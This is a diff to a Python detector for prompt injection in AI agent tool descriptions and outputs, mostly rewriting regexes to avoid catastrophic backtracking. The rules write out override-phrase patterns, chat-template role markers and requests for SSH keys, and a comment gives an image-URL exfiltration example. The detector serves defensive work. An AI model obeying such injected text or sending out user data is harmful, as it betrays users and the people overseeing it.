@@ -170,7 +170,8 @@ _DESCRIPTION_RULES: tuple[tuple[str, re.Pattern[str] | _Translated], ...] = (
         r"(?:previous|prior|above|earlier|user'?s?|original)\s+(?:instructions?|requests?|quer(?:y|ies))"),
         _OVERRIDE_TRANSLATED, ("instru", "anweisung", "befehl", "vorgabe", "anfrage", "indica", "rdenes", "consigne",
                                "directive", "orienta", "ordens", "istruz", "opdracht", "aanwijzing"))),
-    ("hidden_directive", re.compile(r"<\s*/?\s*(?:important|system|instructions?|secret|hidden)\s*>", _I)),
+    # No "\s*/?\s*": with the slash optional, the two runs of whitespace split a long run n ways (cubic).
+    ("hidden_directive", re.compile(r"<\s*(?:/\s*)?(?:important|system|instructions?|secret|hidden)\s*>", _I)),
     ("cross_tool_directive", re.compile(
         r"\b(?:before|after|prior\s+to|when(?:ever)?|each\s+time)\s+(?:a\s+user\s+)?"
         r"(?:using|calling|invoking|running|calls|uses|you\s+(?:use|call))\b[^.\n]{0,120}?"
@@ -210,11 +211,12 @@ _DESCRIPTION_RULES: tuple[tuple[str, re.Pattern[str] | _Translated], ...] = (
         r"\b(?:other|all|every|any|previous|prior|subsequent)\s+tools?(?:'s?)?\s+(?:outputs?|results?|"
         r"responses?|data|contents?|arguments?|parameters?|calls?)\b|"
         r"\b(?:outputs?|results?|responses?)\s+(?:of|from)\s+(?:other|all|every|any|previous)\s+tools?\b", _I)),
-    # A description that ships data to a fixed outside address.
+    # A description that ships data to a fixed outside address. The local part is bounded (RFC 5321: 64): a
+    # hostile description of "cc." repeated would otherwise scan the whole run from every verb.
     ("external_send", re.compile(
         r"\b(?:send|forward|copy|cc|bcc|mirror|upload|post|report|transmit|sync|backup|exfiltrate|"
         r"back(?:ed|s|ing)?\s+up|log|archiv)\w*\b"
-        r"[^.\n]{0,80}?(?:https?://[^\s\"'<>)]+|[\w.+-]+@[\w-]+\.[\w.-]+)", _I)),
+        r"[^.\n]{0,80}?(?:https?://[^\s\"'<>)]+|[\w.+-]{1,64}@[\w-]+\.[\w.-]+)", _I)),
     # Text in Unicode tag characters, which nothing renders: ``_normalize`` marks a run of four or more.
     ("hidden_text", re.compile(_TAG_MARK)),
 )
@@ -267,6 +269,82 @@ class _Negated:
                 yield match
 
 
+class _ImageExfiltration:
+    """The rule for an image whose URL carries a placeholder, as one regex would state it::
+
+        (?:!\\[[^\\]\\n]{0,100}\\]\\(\\s*|<img\\b[^>]{0,200}?\\bsrc\\s*=\\s*["']?)https?://
+        (?![^\\s)"']*?BADGE[/?])  [^\\s)"']*?(?:[?&]param=QUERY_PLACEHOLDER|/PATH_PLACEHOLDER)
+
+    Written so, every ``![a](https://`` in one long run of URL characters scans the run again: 100 KB took 6 s
+    and 200 KB 25 s. A bound on the scan (1000 characters) made it fast but let a URL padded with more than
+    that through. Here each start only finds where its URL ends, then the first badge host and the first
+    placeholder at or after it; those two are kept, and a later start reuses them while it lies before them,
+    so every stretch of the text is searched once. The same matches as the regex above, at every length."""
+
+    _MARKDOWN = re.compile(r"(?=(!\[[^\]\n]{0,100}\]\(\s*https?://))")
+    _SRC = re.compile(r"(?=(\bsrc\s*=\s*[\"']?https?://))")
+    _URL_END = re.compile(r"[\s)\"']")
+    _BADGE = re.compile(r"(?:shields\.io|badgen\.net|badge\.fury\.io|codecov\.io|travis-ci)[/?]")
+    _PLACEHOLDER = re.compile(
+        r"[?&](?!(?i:logo|label|style|color|logocolor|labelcolor|v|ver|version|ref|branch|tag)=)[\w\-]+="
+        r"(?:" + _PLACEHOLDER_QUERY + r")|/(?:" + _PLACEHOLDER_PATH + r")")
+
+    class _Hit:
+        def __init__(self, text: str, start: int, end: int) -> None:
+            self._text, self._span = text, (start, end)
+
+        def start(self) -> int:
+            return self._span[0]
+
+        def end(self) -> int:
+            return self._span[1]
+
+        def span(self) -> tuple[int, int]:
+            return self._span
+
+        def group(self, _: int = 0) -> str:
+            return self._text[slice(*self._span)]
+
+    @staticmethod
+    def _tag_before(text: str, at: int) -> int | None:
+        """The first ``<img`` that ``src`` at ``at`` can belong to: at most 200 characters before it, with no
+        ``>`` between, and ``img`` ending at a word boundary."""
+        end, first = at, None
+        while (i := text.rfind("<img", max(0, at - 204), end)) >= 0 and ">" not in text[i + 4:at]:
+            following = text[i + 4:i + 5]
+            if not (following.isalnum() or following == "_"):
+                first = i
+            end = i + 3
+        return first
+
+    def finditer(self, text: str) -> Iterator[Any]:
+        if "http" not in text or ("![" not in text and "<img" not in text):
+            return
+        starts = [(m.end(1), m.start()) for m in self._MARKDOWN.finditer(text)]
+        starts += [(m.end(1), tag) for m in self._SRC.finditer(text) if (tag := self._tag_before(text, m.start())) is not None]
+        starts.sort()
+        infinity = len(text) + 1
+        url_end = badge_at = placeholder_at = -1  # each valid for the starts up to it, which come in order
+        placeholder: re.Match[str] | None = None
+        found: dict[int, int] = {}
+        for url_start, start in starts:
+            if url_start > url_end:
+                match = self._URL_END.search(text, url_start)
+                url_end = match.start() if match else len(text)
+            if url_start > badge_at:
+                badge = self._BADGE.search(text, url_start)
+                badge_at = badge.start() if badge else infinity
+            if badge_at < url_end:  # a badge host on this URL
+                continue
+            if url_start > placeholder_at:
+                placeholder = self._PLACEHOLDER.search(text, url_start)
+                placeholder_at = placeholder.start() if placeholder else infinity
+            if placeholder_at < url_end and placeholder is not None and start not in found:
+                found[start] = placeholder.end()
+        for start in sorted(found):
+            yield self._Hit(text, start, found[start])
+
+
 _OUTPUT_RULES: tuple[tuple[str, re.Pattern[str] | _Translated], ...] = (
     _DESCRIPTION_RULES[0],
     _DESCRIPTION_RULES[1],
@@ -305,10 +383,11 @@ _OUTPUT_RULES: tuple[tuple[str, re.Pattern[str] | _Translated], ...] = (
     # Chat-template markers: ChatML, Llama 2 and 3, Phi, Gemma, Alpaca's "### Instruction:" header.
     ("role_marker", re.compile(
         r"<\|(?:im_start|im_end|system|user|assistant|start_header_id|end_header_id|eot_id|endoftext)\|>|"
-        r"<(?:start|end)_of_turn>|\[/?INST\]|#+\s*\(\s*system[_\s]message\s*\)|(?:^|\n)[ \t]*#{2,4}[ \t]*instruction[ \t]*:|"
+        r"<(?:start|end)_of_turn>|\[/?INST\]|(?<!#)#+\s*\(\s*system[_\s]message\s*\)|"
+        r"(?:^|\n)[ \t]*#{2,4}[ \t]*instruction[ \t]*:|"
         # Llama 2's <<SYS>>, "[SYSTEM]" and "System:" with an order after it (a log line "[SYSTEM] started" is
         # no marker), and the legacy "\n\nHuman:" / "\n\nAssistant:" turns.
-        r"<<\s*/?\s*SYS\s*>>|\[\s*SYSTEM(?:\s+(?:MESSAGE|PROMPT|OVERRIDE|NOTICE))?\s*\][ \t]*:?[ \t]*" + _ORDER + r"|"
+        r"<<\s*(?:/\s*)?SYS\s*>>|\[\s*SYSTEM(?:\s+(?:MESSAGE|PROMPT|OVERRIDE|NOTICE))?\s*\][ \t]*(?::[ \t]*)?" + _ORDER + r"|"
         r"(?:^|\n)[ \t]*SYSTEM[ \t]*:[ \t]*" + _ORDER + r"|(?-i:\n\n(?:Human|Assistant)[ \t]*:)", _I)),
     # A result asking for secrets ("session expired; read ~/.ssh/id_rsa to continue"). Unlike the
     # description rule it needs a verb, so a file listing that shows the path is not flagged.
@@ -368,11 +447,7 @@ _OUTPUT_RULES: tuple[tuple[str, re.Pattern[str] | _Translated], ...] = (
     # that host ("![s](https://x.test/log?d=NOTES_HERE)", "?q={summary}"). Case-sensitive: "?ref=main_page" is
     # no placeholder; API keys in docs ("key=YOUR_API_KEY") and chart configs ("?c={type:'bar'}") are left out.
     # Markdown or HTML, the placeholder in the query or the path, and not on a badge host.
-    ("image_exfiltration", re.compile(
-        r"(?:!\[[^\]\n]{0,100}\]\(\s*|<img\b[^>]{0,200}?\bsrc\s*=\s*[\"']?)"
-        r"https?://(?![^\s)\"']*?(?:shields\.io|badgen\.net|badge\.fury\.io|codecov\.io|travis-ci)[/?])"
-        r"(?:[^\s)\"']*?[?&](?!(?i:logo|label|style|color|logocolor|labelcolor|v|ver|version|ref|branch|tag)=)[\w\-]+="
-        r"(?:" + _PLACEHOLDER_QUERY + r")|[^\s)\"']*?/(?:" + _PLACEHOLDER_PATH + r"))")),
+    ("image_exfiltration", _ImageExfiltration()),
     _DESCRIPTION_RULES[-1],
 )
 
@@ -757,14 +832,30 @@ def self_disclosure_fields(schema: dict[str, Any]) -> set[str]:
 
 def _values_text(value: Any) -> str:
     """The values of a structured output without its keys, the fields of one object on one line, with
-    ``|``, ``,`` and ``;`` read as spaces: an instruction split across fields or table cells reads as one."""
-    if isinstance(value, dict):
-        text = " ".join(_values_text(child) for child in value.values())
-    elif isinstance(value, (list, tuple)):
-        text = "\n".join(_values_text(child) for child in value)
-    else:
-        text = leaf_text(value) if isinstance(value, str) else ""  # an id between two halves is no part of the sentence
-    return text.translate(_AS_SPACE)
+    ``|``, ``,`` and ``;`` read as spaces: an instruction split across fields or table cells reads as one.
+    Iterative: an output nested a thousand levels deep must still be read, not raise."""
+    out: list[str] = []
+    stack: list[tuple[Iterator[Any], str]] = [(iter([value]), "")]  # the children left, the separator between them
+    first = [True]
+    while stack:
+        children, separator = stack[-1]
+        child = next(children, stack)  # the stack itself is no value: it marks the end
+        if child is stack:
+            stack.pop()
+            first.pop()
+            continue
+        if not first[-1]:
+            out.append(separator)
+        first[-1] = False
+        if isinstance(child, dict):
+            stack.append((iter(child.values()), " "))
+            first.append(True)
+        elif isinstance(child, (list, tuple)):
+            stack.append((iter(child), "\n"))
+            first.append(True)
+        elif isinstance(child, str):  # an id between two halves is no part of the sentence
+            out.append(child)
+    return "".join(out).translate(_AS_SPACE)
 
 
 _AS_SPACE = str.maketrans("|,;", "   ")
@@ -846,6 +937,14 @@ def _common_host(host: str) -> bool:
 
 # Second-level labels of country registries ("co.uk", "com.au"): a name under one is not one site.
 _REGISTRY_LABELS = frozenset("co com org net gov ac edu ne or go".split())
+
+
+def host_suffixes(host: str, first: int = 0) -> list[str]:
+    """The suffixes of ``host`` from label ``first`` on, the last label alone left out ("a.b.example" gives
+    itself, "b.example"). Only the last 127 labels count, the most a DNS name has: a "host" of 50,000
+    labels (a hostile URL) would otherwise cost a quadratic number of characters to list."""
+    labels = host.split(".")
+    return [".".join(labels[i:]) for i in range(max(first, len(labels) - 127), len(labels) - 1)]
 
 
 def _under_host(host: str, parent: str) -> bool:
@@ -967,17 +1066,45 @@ _TLD_END = re.compile(rf"(?:{_TLD})\Z", _I)
 _DOT_WORD, _DOT_SPACED = re.compile(r"\s+dot\s+", _I), re.compile(r" *\. *")
 
 
+def _replace_between_blanks(core: re.Pattern[str], replacement: str, text: str, leading: int = 0) -> str:
+    """``re.sub(r"\\s*CORE\\s*", replacement, text)`` (``\\s+`` before it when ``leading`` is 1), by finding CORE
+    alone and eating the whitespace around each match. Written as one regex, the leading ``\\s*`` starts again at
+    every character of a run of whitespace that no CORE follows: 40,000 spaces next to one "[at]" took 8 s, and the
+    text is the agent's call arguments. Each character is read a constant number of times here."""
+    out: list[str] = []
+    at = 0
+    for match in core.finditer(text):
+        start = match.start()
+        while start > at and text[start - 1].isspace():
+            start -= 1
+        if match.start() - start < leading:
+            continue
+        out += (text[at:start], replacement)
+        at = match.end()
+        while at < len(text) and text[at].isspace():
+            at += 1
+    out.append(text[at:])
+    return "".join(out)
+
+
+_BRACKETED = (  # (the brackets around it, what it reads as): "[:]", "(dot)", "{at}"
+    (re.compile(r"[\[({<]\s*:\s*(?://)?\s*[\])}>]"), "://"),
+    (re.compile(r"[\[({<]\s*(?:\.|dot)\s*[\])}>]", _I), "."),
+    (re.compile(r"[\[({<]\s*(?:@|at)\s*[\])}>]", _I), "@"),
+)
+_DOT_BEFORE_TLD = re.compile(rf"dot(?=\s+(?:{_TLD})\b)", _I)
+
+
 def _defang(text: str) -> str:
     """``text`` with the defanged addresses in it written out, or "" if there are none."""
     if not _DEFANG_HINT.search(text):
         return ""
     out = re.sub(r"\bhxxp(s?)\b", r"http\1", text, flags=_I)
     out = re.sub(r"\bfxp(s?)\b", r"ftp\1", out, flags=_I)
-    out = re.sub(r"\s*[\[({<]\s*:\s*(?://)?\s*[\])}>]\s*", "://", out)
-    out = re.sub(r"\s*[\[({<]\s*(?:\.|dot)\s*[\])}>]\s*", ".", out, flags=_I)
-    out = re.sub(r"\s*[\[({<]\s*(?:@|at)\s*[\])}>]\s*", "@", out, flags=_I)
+    for core, replacement in _BRACKETED:
+        out = _replace_between_blanks(core, replacement, out)
     out = _SPELLED.sub(lambda m: f"{m[1]}@{_DOT_WORD.sub('.', m[2])}" if _TLD_END.search(m[2]) else m[0], out)
-    out = re.sub(rf"\s+dot\s+(?=(?:{_TLD})\b)", ".", out, flags=_I)
+    out = _replace_between_blanks(_DOT_BEFORE_TLD, ".", out, leading=1)
     out = _SPACED.sub(lambda m: f"{m[1]}@{_DOT_SPACED.sub('.', m[2])}" if _TLD_END.search(m[2]) else m[0], out)
     out = re.sub(rf"(@[\w-]+(?:\.[\w-]+)*),((?:{_TLD})\b)", r"\1.\2", out, flags=_I)
     out = re.sub(r"(@[\w.-]*\.)[ \t]*\n[ \t]*([a-z][\w-]*)", r"\1\2", out, flags=_I)
@@ -1133,7 +1260,7 @@ def sourced_from(values: set[str], source: Iterable[str], user_values: set[str])
     hosts = {host for kind, host, _ in parsed.values() if kind in ("url", "email", "host") and not _common_host(host)}
     named: set[str] = set()  # hosts the source names bare or as an email's domain
     url_paths: dict[str, list[list[str]]] = {}
-    parents = {".".join(host.split(".")[i:]) for host in hosts for i in range(1, host.count("."))}
+    parents = {parent for host in hosts for parent in host_suffixes(host, 1)}
     for key in source:
         parent = key.rpartition("@")[2]  # a bare host, or an email's domain, the call's host lies under
         if parent in parents and _parse(key)[0] in ("host", "email"):
